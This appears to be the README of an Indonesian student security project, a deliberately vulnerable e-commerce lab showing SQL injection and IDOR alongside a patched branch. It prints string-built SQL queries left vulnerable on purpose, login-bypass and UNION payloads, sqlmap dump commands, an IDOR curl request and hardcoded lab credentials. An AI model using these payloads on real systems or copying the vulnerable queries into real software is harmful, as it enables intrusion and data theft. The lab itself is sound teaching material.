# TechStore - Penetration Testing Lab (SQL Injection & IDOR)
**Tugas Akhir / Final Project Keamanan Jaringan — Kelompok 17**

TechStore adalah aplikasi web e-commerce modern berskala mini yang dirancang secara khusus sebagai lingkungan pengujian penetrasi (*penetration testing lab*) dan simulasi kerentanan keamanan web. Aplikasi ini mengimplementasikan dua kerentanan paling berisiko tinggi dari standar **OWASP Top 10**:
1. **SQL Injection (SQLi)** — *CWE-89 / OWASP A03:2021 (Injection)* pada form login dan fitur pencarian produk.
2. **Insecure Direct Object Reference (IDOR)** — *CWE-639 / OWASP A01:2021 (Broken Access Control)* pada modul invoice dan riwayat pesanan.

Aplikasi ini memiliki 2 status implementasi kode:
- **Branch `main` (Vulnerable)**: Implementasi tanpa pengamanan masukan dan tanpa otorisasi level objek untuk demonstrasi eksploitasi.
- **Branch `patched` (Remediated)**: Implementasi aman menggunakan *parameterized queries* dan pengecekan hak kepemilikan objek (*ownership check*).

---

## 1. Arsitektur Sistem & Pemetaan Port

Sistem berjalan secara lokal (*on-premise*) menggunakan arsitektur 3-lapis (*3-tier architecture*):

```mermaid
flowchart TD
    Client["Client / Pentester (Browser / Burp Suite / curl / sqlmap)"]
    FE["Frontend: Next.js 16 (Port 3000)<br/>UI Katalog, Form Login, Invoice Viewer"]
    BE["Backend: Express.js (Port 5000)<br/>REST API Auth, Products, Orders"]
    DB[("Database: PostgreSQL 16 (Port 5433)<br/>Container: pentest_postgres<br/>pentest_db")]

    Client -->|HTTP / :3000| FE
    Client -->|REST API / :5000| BE
    FE -->|API Calls / :5000| BE
    BE -->|SQL Queries / :5433| DB
```

| Layanan | Port Host | Port Container / Internal | Teknologi | Deskripsi |
| :--- | :--- | :--- | :--- | :--- |
| **Frontend** | `3000` | `3000` | Next.js 16 (Turbopack, Tailwind) | Tampilan UI e-commerce, login, pencarian, invoice |
| **Backend** | `5000` | `5000` | Express.js, Node.js v22 | REST API, manajemen JWT, eksekusi query PostgreSQL |
| **Database** | `5433` | `5432` | PostgreSQL 16 Alpine | Database relasional menyimpan data user, produk, order |

---

## 2. Struktur Direktori Proyek

```text
finpro-kemjar-17/
├── backend/
│   ├── src/
│   │   ├── middleware/     # JWT authentication middleware
│   │   ├── routes/         # auth.js, products.js, orders.js
│   │   ├── db.js           # Koneksi PostgreSQL pool (port 5433)
│   │   └── index.js        # Server Express.js entry point
│   ├── .env                # Variabel environment backend
│   └── package.json
├── database/
│   └── init.sql            # Skrip DDL skema dan DML seeding data awal
├── docker-compose.yml      # Orkestrasi container PostgreSQL
├── frontend/
│   ├── src/
│   │   ├── app/            # Next.js App Router (page.tsx, login, orders)
│   │   ├── components/     # Navbar, ProductCard, dll.
│   │   └── lib/api.ts      # API fetch client & penanganan error
│   ├── .env.local          # Variabel environment frontend
│   └── package.json
├── plan/                   # Dokumen perencanaan teknis lab & pemetaan laporan
├── package.json            # Script runner root proyek
├── run-local.sh            # Skrip satu-klik untuk menjalankan seluruh stack
└── README.md               # Dokumentasi lengkap proyek
```

---

## 3. Konfigurasi Environment (`.env`)

### Backend (`backend/.env`)
```env
PORT=5000
DATABASE_URL=postgresql://admin:admin123@localhost:5433/pentest_db
JWT_SECRET=supersecret_pentest_key
```

### Frontend (`frontend/.env.local`)
```env
NEXT_PUBLIC_API_URL=http://localhost:5000
```

---

## 4. Akun Pengguna & Dataset Pengujian

Database telah diinisialisasi otomatis dari `database/init.sql` dengan akun berikut:

| Username | Password | Role | Nama Lengkap | Keterangan dalam Skenario |
| :--- | :--- | :--- | :--- | :--- |
| **admin** | `AdminMaster2026!` | `admin` | Budi Santoso | Target pengambilalihan akun via SQLi Auth Bypass |
| **alice** | `AliceSecret#88` | `customer` | Alice Walker | **Korban (Victim)**: Pemilik order invoice #1 & #2 |
| **bob** | `BobPassword123` | `customer` | Bob Miller | **Penyerang (Attacker)**: Pemilik order invoice #3 & #4 |

---

## 5. Cara Menjalankan Proyek di Lokal

### Prasyarat
- **Docker & Docker Compose**
- **Node.js** (v18 ke atas) & **npm**

### Opsi A: Menggunakan Runner Script Satu-Klik (Direkomendasikan)
Cukup jalankan satu perintah berikut di root direktori proyek:
```bash
./run-local.sh
```
Skrip akan secara otomatis:
1. Menyalakan database PostgreSQL via Docker Compose (`pentest_postgres` di port 5433).
2. Menjalankan server backend Express.js di port 5000.
3. Menjalankan server frontend Next.js di port 3000.
4. Menangani graceful shutdown saat tombol `Ctrl+C` ditekan.

---

### Opsi B: Menjalankan Secara Terpisah (Multi-Terminal)

#### 1. Jalankan Database (Terminal 1)
```bash
docker compose up -d
```
*Pastikan container aktif dengan perintah `docker ps`.*

#### 2. Jalankan Backend (Terminal 2)
```bash
cd backend
npm run dev
```
*Backend aktif di: `http://localhost:5000` (Healthcheck: `GET /api/health`)*

#### 3. Jalankan Frontend (Terminal 3)
```bash
cd frontend
npm run dev
```
*Frontend aktif di: `http://localhost:3000`*

---

### Opsi C: Menggunakan Script Root `npm`
```bash
# Menyalakan database
npm run db:up

# Menjalankan backend (di tab terminal 1)
npm run backend:dev

# Menjalankan frontend (di tab terminal 2)
npm run frontend:dev

# Mematikan database jika selesai
npm run db:down
```

---

## 6. Skenario & Panduan Eksploitasi (Branch `main`)

### 6.1 Skenario 1: SQL Injection — Authentication Bypass di Form Login
- **Endpoint**: `POST /api/auth/login`
- **Lokasi Celah**: `backend/src/routes/auth.js`
  ```javascript
  const query = `SELECT * FROM users WHERE username = '${username}' AND password = '${password}'`;
  ```
- **Langkah Eksploitasi via Browser**:
  1. Akses `http://localhost:3000/login`.
  2. Isi kolom **Username** dengan payload:
     ```sql
     ' OR '1'='1' --
     ```
  3. Isi kolom **Password** dengan sembarang teks (misal: `123456`).
  4. Klik tombol **Masuk ke Akun**.
  5. **Hasil**: Berhasil login sebagai **Budi Santoso (Admin)** tanpa mengetahui kredensial yang sah.
- **Pengujian via cURL**:
  ```bash
  curl -X POST http://localhost:5000/api/auth/login \
    -H "Content-Type: application/json" \
    -d '{"username": "'\'' OR '\''1'\''='\''1'\'' --", "password": "any"}'
  ```

---

### 6.2 Skenario 2: SQL Injection — UNION-Based Data Extraction di Pencarian Produk
- **Endpoint**: `GET /api/products?search=...`
- **Lokasi Celah**: `backend/src/routes/products.js`
  ```javascript
  const query = `SELECT * FROM products WHERE name ILIKE '%${search}%'`;
  ```
- **Langkah Eksploitasi**:
  1. Akses `http://localhost:3000`.
  2. Ketik tanda petik tunggal `'` di search bar untuk memicu error database PostgreSQL.
  3. Masukkan payload UNION berikut pada search bar:
     ```sql
     ' UNION SELECT NULL, username, email, NULL, NULL, role, NULL FROM users --
     ```
  4. **Hasil**: Data sensitif kredensial pengguna (username, email, role) dari tabel `users` tereksfiltrasi dan muncul langsung pada kartu produk di layar.
- **Pengujian Otomatis via `sqlmap`**:
  ```bash
  sqlmap -u "http://localhost:5000/api/products?search=test" --batch --dbs
  sqlmap -u "http://localhost:5000/api/products?search=test" -D pentest_db -T users --dump
  ```

---

### 6.3 Skenario 3: IDOR — Akses Invoice Pengguna Lain di `/orders/[id]`
- **Endpoint**: `GET /api/orders/:id`
- **Lokasi Celah**: `backend/src/routes/orders.js`
  ```javascript
  // Mengambil order berdasarkan ID tanpa memverifikasi apakah req.user.id == order.user_id
  const result = await pool.query('SELECT ... FROM orders WHERE orders.id = $1', [id]);
  ```
- **Langkah Eksploitasi via Browser**:
  1. Buka `http://localhost:3000/login`.
  2. Login menggunakan akun sah **Bob** (`bob` / `BobPassword123`).
  3. Buka menu **Pesanan Saya** (`http://localhost:3000/orders`), Bob hanya memiliki Order #3 dan Order #4.
  4. Buka salah satu order, lalu manipulasi URL browser menjadi order milik Alice:
     ```text
     http://localhost:3000/orders/1
     ```
  5. **Hasil**: Halaman invoice berhasil menampilkan seluruh informasi sensitif (PII) milik **Alice Walker** (nama lengkap, nomor HP, dan alamat rumah pribadi di Kemang) tanpa validasi hak kepemilikan.
- **Pengujian via cURL**:
  ```bash
  # Menggunakan JWT token milik Bob untuk membaca order #1 milik Alice:
  curl -X GET http://localhost:5000/api/orders/1 \
    -H "Authorization: Bearer <TOKEN_BOB>"
  ```

---

## 7. Panduan Remediasi (Branch `patched`)

### 7.1 Remediasi SQL Injection: Parameterized Queries
Ganti seluruh interpolasi string SQL dengan parameterized query native PostgreSQL driver:
```javascript
// AMAN (backend/src/routes/auth.js)
const query = 'SELECT id, username, password, full_name, role FROM users WHERE username = $1';
const result = await pool.query(query, [username]);

// AMAN (backend/src/routes/products.js)
const query = 'SELECT * FROM products WHERE name ILIKE $1';
const result = await pool.query(query, [`%${search}%`]);
```

### 7.2 Remediasi IDOR: Object-Level Authorization Check
Tambahkan verifikasi hak akses pada setiap permintaan invoice:
```javascript
// AMAN (backend/src/routes/orders.js)
if (order.user_id !== req.user.id && req.user.role !== 'admin') {
  return res.status(403).json({
    error: 'Forbidden: You do not have permission to view this order invoice'
  });
}
```

---

## 8. Verifikasi Hasil Uji (Before vs After)

| Skenario Pengujian | Hasil pada Branch `main` (Vulnerable) | Hasil pada Branch `patched` (Remediated) |
| :--- | :--- | :--- |
| **SQLi Login Bypass** | HTTP `200 OK` (Masuk sebagai Admin) | HTTP `401 Unauthorized` (Invalid credentials) |
| **SQLi Search UNION** | Data tabel `users` muncul di katalog | HTTP `200 OK` (0 produk ditemukan, payload jadi string) |
| **Automated `sqlmap`** | Kerentanan ditemukan & DB di-dump | `all tested parameters do not appear to be injectable` |
| **IDOR Invoice Bob ke Alice** | HTTP `200 OK` (PII Alice terekspos) | HTTP `403 Forbidden` (Akses ditolak di UI & API) |

---

## 9. Pemetaan Artefak ke Laporan Akhir

Seluruh dokumen rancangan teknis pengujian dan template bab laporan praktikum tersedia pada direktori [`plan/`](./plan):
- `plan/00-overview-and-architecture.md`: Konsep & arsitektur sistem
- `plan/01-database-and-backend-vulnerable.md`: Spesifikasi backend rentan
- `plan/02-frontend-ui-and-integration.md`: Integrasi antarmuka Next.js
- `plan/03-enumeration-plan.md`: Prosedur pemindaian nmap & fingerprinting
- `plan/04-exploitation-sqli.md`: Analisis & payload SQL Injection
- `plan/05-exploitation-idor.md`: Analisis & skenario eksploitasi IDOR
- `plan/06-remediation-plan.md`: Implementasi perbaikan kode aman
- `plan/07-proof-and-verification.md`: Matriks bukti pengujian ulang
- `plan/08-report-mapping.md`: Pemetaan kode artefak ART-01 s/d ART-25 ke Bab I - Bab VI laporan
